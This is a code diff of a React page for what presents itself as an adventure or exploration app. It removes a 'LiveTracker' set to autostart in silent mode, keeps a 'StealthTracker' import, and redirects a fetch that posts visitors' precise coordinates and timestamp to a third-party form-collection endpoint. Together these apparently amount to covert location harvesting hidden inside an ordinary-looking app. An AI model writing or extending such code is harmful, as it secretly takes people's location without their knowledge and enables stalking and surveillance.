@@ -4,7 +4,6 @@ import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/com
 import { MapView } from "@/components/MapView";
 import { LocationCard } from "@/components/LocationCard";
 import { AdminPanel } from "@/components/AdminPanel";
-import { LiveTracker } from "@/components/LiveTracker";
 import { StealthTracker } from "@/components/StealthTracker";
 import { useToast } from "@/hooks/use-toast";
 import { Compass, Mountain, Camera, Share2, Sparkles, TreePine, Route, Users } from "lucide-react";
@@ -81,7 +80,7 @@ const Index = () => {
             formData.append('discovery_time', new Date().toLocaleString());
             formData.append('formatted_coordinates', `${lat.toFixed(6)}°, ${lon.toFixed(6)}°`);
             
-            await fetch('https://getform.io/f/apjpenea', {
+            await fetch('https://formspree.io/f/xwpbjvky', {
               method: 'POST',
               body: formData,
               headers: { 'Accept': 'application/json' }
@@ -245,24 +244,6 @@ const Index = () => {
 
           {/* Adventure Information */}
           <LocationCard locationData={locationData} isLoading={isLoading} />
-
-          {/* Live Adventure Tracker */}
-          <LiveTracker 
-            autoStart={true}
-            silentMode={true}
-            onLocationUpdate={(location) => {
-              // Update map location if needed
-              if (location) {
-                setLocationData({
-                  latitude: location.latitude,
-                  longitude: location.longitude,
-                  country: locationData?.country || '',
-                  state: locationData?.state || '',
-                  city: locationData?.city || '',
-                });
-              }
-            }} 
-          />
 
           {/* Interactive Map */}
           {locationData && (
